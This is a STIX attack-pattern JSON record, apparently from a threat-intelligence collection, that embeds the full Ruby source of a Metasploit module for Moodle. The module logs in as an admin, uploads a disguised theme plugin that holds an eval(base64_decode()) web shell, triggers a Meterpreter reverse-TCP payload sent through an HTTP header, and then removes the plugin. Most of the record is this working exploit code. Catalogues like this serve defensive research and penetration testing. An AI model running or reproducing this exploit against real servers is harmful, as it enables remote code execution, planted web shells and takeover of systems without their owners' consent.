{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0c68ab5e-5858-4b5c-a099-3be90fdf69a6",
    "created": "2024-08-14T17:09:06.95021Z",
    "modified": "2024-08-14T17:09:06.950214Z",
    "name": "Moodle Admin Shell Upload",
    "description": " This module will generate a plugin which can receive a malicious payload request and upload it to a server running Moodle provided valid admin credentials are used.  Then the payload is sent for execution, and the plugin uninstalled.  You must have an admin account to exploit this vulnerability.  Successfully tested against 3.6.3, 3.8.0, 3.9.0, 3.10.0, 3.11.2  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/moodle_admin_shell_upload.rb",
            "external_id": "moodle_admin_shell_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://pentest.com.tr/exploits/Moodle-3-6-3-Install-Plugin-Remote-Command-Execution.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Moodle\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Moodle Admin Shell Upload',\n        'Description' => %q{\n          This module will generate a plugin which can receive a malicious\n          payload request and upload it to a server running Moodle\n          provided valid admin credentials are used.  Then the payload\n          is sent for execution, and the plugin uninstalled.\n\n          You must have an admin account to exploit this vulnerability.\n\n          Successfully tested against 3.6.3, 3.8.0, 3.9.0, 3.10.0, 3.11.2\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'AkkuS <\u00d6zkan Mustafa Akku\u015f>', # Discovery & PoC & Metasploit module @ehakkus\n          'h00die' # msf module cleanup and inclusion\n        ],\n        'References' => [\n          ['URL', 'http://pentest.com.tr/exploits/Moodle-3-6-3-Install-Plugin-Remote-Command-Execution.html'],\n          ['EDB', '46775'],\n          ['CVE', '2019-11631'] # rejected, its a feature!\n        ],\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [['Automatic', {}]],\n        'Privileged' => false,\n        'DisclosureDate' => '2019-04-28',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'Payload' => 'php/meterpreter/reverse_tcp' },\n        'Payload' => {\n          'BadChars' => \"'\",\n          'Space' => 6070 # apache default is 8196, but 35% overhead for base64 encoding\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'Admin username to authenticate with', 'admin']),\n        OptString.new('PASSWORD', [false, 'Admin password to authenticate with', ''])\n      ]\n    )\n  end\n\n  def create_addon_file\n    # There are syntax errors in creating zip file. So the payload was sent as base64.\n    plugin_file = Rex::Zip::Archive.new\n    header = Rex::Text.rand_text_alpha_upper(4)\n    plugin_name = Rex::Text.rand_text_alpha_lower(8)\n\n    print_status(\"Creating plugin named: #{plugin_name} with poisoned header: #{header}\")\n\n    path = \"#{plugin_name}/version.php\"\n    path2 = \"#{plugin_name}/lang/en/theme_#{plugin_name}.php\"\n    # \"$plugin->version\" and \"$plugin->component\" contents are required to accept Moodle plugin.\n    plugin_file.add_file(path, \"<?php $plugin->version = #{Time.now.to_time.to_i}; $plugin->component = 'theme_#{plugin_name}';\")\n    plugin_file.add_file(path2, \"<?php eval(base64_decode($_SERVER['HTTP_#{header}'])); ?>\")\n    # plugin_file.add_file(path2, \"<?php #{payload.encoded}) ?>\")\n    return plugin_file.pack, header, plugin_name\n  end\n\n  def exec_code(plugin_name, header)\n    # Base64 was encoded in \"PHP\". This process was sent as \"HTTP headers\".\n    print_status('Triggering payload')\n    send_request_cgi({\n      'keep_cookies' => true,\n      'uri' => normalize_uri(target_uri.path, 'theme', plugin_name, 'lang', 'en', \"theme_#{plugin_name}.php\"),\n      'raw_headers' => \"#{header}: #{Rex::Text.encode_base64(payload.encoded)}\\r\\n\"\n    })\n  end\n\n  def check\n    v = moodle_version\n    return CheckCode::Detected('Unable to determine moodle version') if v.nil?\n\n    # This is a feature, not a vuln, so we assume this to work on 3.0.0+\n    # assuming the plugin arch changed before that.\n    # > 3.0, < 3.9\n    version = Rex::Version.new(v)\n    if version > Rex::Version.new('3.0.0')\n      return CheckCode::Appears(\"Exploitable Moodle version #{v} detected\")\n    end\n\n    CheckCode::Safe(\"Non-exploitable Moodle version #{v} detected\")\n  end\n\n  def exploit\n    v = moodle_version\n    fail_with(Failure::NoTarget, 'Unable to determine moodle version') if v.nil?\n\n    version = Rex::Version.new(v)\n    print_status(\"Authenticating as user: #{datastore['USERNAME']}\")\n    cookies = moodle_login(datastore['USERNAME'], datastore['PASSWORD'])\n    fail_with(Failure::NoAccess, 'Unable to login. Check credentials') if cookies.nil? || cookies.empty?\n    cookies.each do |cookie|\n      cookie_jar.add(cookie)\n    end\n\n    print_good(\"Authentication was successful with user: #{datastore['USERNAME']}\")\n    print_status('Creating addon file')\n    addon_content, header, addon_name = create_addon_file\n    print_status('Uploading addon')\n    file_id, sesskey = upload_addon(addon_name, version, addon_content)\n    fail_with(Failure::NoAccess, 'Unable to upload addon.  Make sure you are able to upload plugins with current permissions') if file_id.nil?\n    print_good('Upload Successful.  Integrating addon')\n    ret = plugin_integration(sesskey, file_id, addon_name)\n    if ret.nil?\n      fail_with(Failure::NoAccess, 'Install not successful')\n    end\n    exec_code(addon_name, header)\n    print_status('Uninstalling plugin after 5 second delay so payload can change directories')\n    sleep(5)\n    remove_plugin(\"theme_#{addon_name}\", version, sesskey)\n  end\n\n  def on_new_session(_)\n    print_good('You will need to change directories on meterpreter to get full functionality. Try: cd /tmp')\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-28",
    "x_mitre_platforms": [
        "php'"
    ]
}